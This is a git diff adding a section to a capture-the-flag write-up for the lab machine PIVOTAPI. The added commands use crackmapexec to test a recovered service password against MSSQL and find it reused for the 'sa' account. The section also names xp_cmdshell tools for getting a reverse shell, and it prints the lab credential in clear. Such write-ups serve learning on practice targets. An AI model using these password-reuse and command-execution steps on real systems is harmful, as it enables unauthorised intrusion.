@@ -511,4 +511,31 @@ SMB         10.10.10.240    445    PIVOTAPI         [-] LicorDeBellota.htb\svc_o
 SMB         10.10.10.240    445    PIVOTAPI         [*] Windows 10.0 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False)
 SMB         10.10.10.240    445    PIVOTAPI         [+] LicorDeBellota.htb\svc_mssql:#mssql_s3rV1c3!2020
 ```
+
+- But we don't have access to `mssql`
+```
+└─$ crackmapexec mssql 10.10.10.240 -u svc_mssql -p '#mssql_s3rV1c3!2020'
+MSSQL       10.10.10.240    1433   PIVOTAPI         [*] Windows 10.0 Build 17763 (name:PIVOTAPI) (domain:LicorDeBellota.htb)
+MSSQL       10.10.10.240    1433   PIVOTAPI         [-] ERROR(PIVOTAPI\SQLEXPRESS): Line 1: Error de inicio de sesión del usuario 'LICORDEBELLOTA\svc_mssql'.
+
+```
+
+- If we change the username to `sa` to test for password-reuse, we have a hit
+```
+└─$ crackmapexec mssql 10.10.10.240 -u sa -p '#mssql_s3rV1c3!2020' --local-auth
+MSSQL       10.10.10.240    1433   PIVOTAPI         [*] Windows 10.0 Build 17763 (name:PIVOTAPI) (domain:PIVOTAPI)
+MSSQL       10.10.10.240    1433   PIVOTAPI         [+] sa:#mssql_s3rV1c3!2020 (Pwn3d!)
+
+```
+
+- Nothing interesting in the database
+  - But `svc_mssql` is `winrm` user, so probably `winrm` port is firewalled
+
+![](./images/12.png)
+
+
+- We can use [mssql_shell](https://github.com/Alamot/code-snippets/blob/master/mssql/mssql_shell.py)
+  - or `impacket-mssqlclient` with `xp_cmdshell` to get a reverse shell
+
+
 ## Root
